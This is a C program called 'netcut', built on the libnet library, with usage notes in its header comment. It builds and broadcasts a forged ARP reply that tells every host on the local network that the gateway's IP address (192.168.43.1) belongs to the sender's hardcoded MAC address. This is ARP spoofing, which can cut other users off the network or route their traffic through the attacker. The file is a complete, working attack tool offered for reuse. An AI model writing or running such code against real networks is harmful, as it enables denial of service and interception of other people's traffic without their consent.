#include <libnet.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/*
This program uses the opensource library libnet-1.1.6. 
This program has been tested under kali linux os. Feel free to change or redestribute this program.
note: use flag -lnet while compiling this program using gcc and make sure the proper version of libnet has been installed.

example: [1] netcut wlan0
		 [2] netcut eth0

email ID - pvimal816@gmail.com
*/

int main(int argc, char *argv[])
{
	int c;
	uint32_t i,j;
	struct in_addr taddr,raddr;
	u_char enet_src[6] = {0xc4,0xe9,0x84,0x0d,0x54,0xb3};  // my wifi adapter mac address. you can change this to automatic get the device mac address.
	u_char enet_dst[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};	// broadcast address
	libnet_t *l;       
	libnet_ptag_t t;
	char *device = NULL;
	uint8_t *packet;
	uint32_t packet_s;
	char errbuf[LIBNET_ERRBUF_SIZE];

	printf("netcut by v.m.patel\n"); 
    
	if(argc < 2){
		printf("Usage : %s [interface]\n",argv[0]);
		exit(0);	
	}
	if (argc > 1)
	{
		device = argv[1];
	}
	
	l = libnet_init(
			LIBNET_LINK_ADV,                        /* injection type */
			device,                                 /* network interface */
    		        errbuf);                                /* errbuf */

	   	
	if (l == NULL)	
    	{
        	fprintf(stderr, "%s", errbuf);
        	exit(EXIT_FAILURE);
	}

   	 if ((inet_aton("192.168.43.1", &taddr)) == 0){    //192.168.43.1 is ip of gateway you can change code to scan this via command line
		printf("error in inet_aton");
        	exit(0);
	}
	i = taddr.s_addr;
	if ((inet_aton("192.168.43.255", &raddr)) == 0){	//192.168.43.255 is broadcast ip you can change code to scan this via command line
		printf("error in inet_aton");
        	exit(0);
	
	}
	j = raddr.s_addr;
      	t = libnet_build_arp(
            		ARPHRD_ETHER,                           /* hardware addr */
          			ETHERTYPE_IP,                           /* protocol addr */
            		6,                                      /* hardware addr size */
					4,                                      /* protocol addr size */
			    	ARPOP_REPLY,                            /* operation type */
					enet_src,                               /* sender hardware addr */
			    	(uint8_t *)&i,                          /* sender protocol addr */
			    	enet_dst,                               /* target hardware addr */
			    	(uint8_t *)&j,                          /* target protocol addr */
			    	NULL,                                   /* payload */
			    	0,                                      /* payload size */
			    	l,                                      /* libnet context */
			    	0);                                     /* libnet id */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
		goto bad;
	    }

	    t = libnet_autobuild_ethernet(
		    enet_dst,                               /* ethernet destination */
		    ETHERTYPE_ARP,                          /* protocol type */
		    l);                                     /* libnet handle */
	    if (t == -1)
	    {
		fprintf(stderr, "Can't build ethernet header: %s\n",
		        libnet_geterror(l));
		goto bad;
	    }


	    if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1)
	    {
		fprintf(stderr, "%s", libnet_geterror(l));
	    }
	    else
	    {
		fprintf(stderr, "packet size: %d\n", packet_s);
		libnet_adv_free_packet(l, packet);
	    }

	    c = libnet_write(l);

	    if (c == -1)
	    {
		fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
		goto bad;
	    }
	    else
	    {
		fprintf(stderr, "Wrote %d byte ARP packet from context \"%s\"; "
		        "check the wire.\n", c, libnet_cq_getlabel(l));
	    }
	    libnet_destroy(l);
	    return (EXIT_SUCCESS);
	bad:
	    libnet_destroy(l);
	    return (EXIT_FAILURE);
}
 


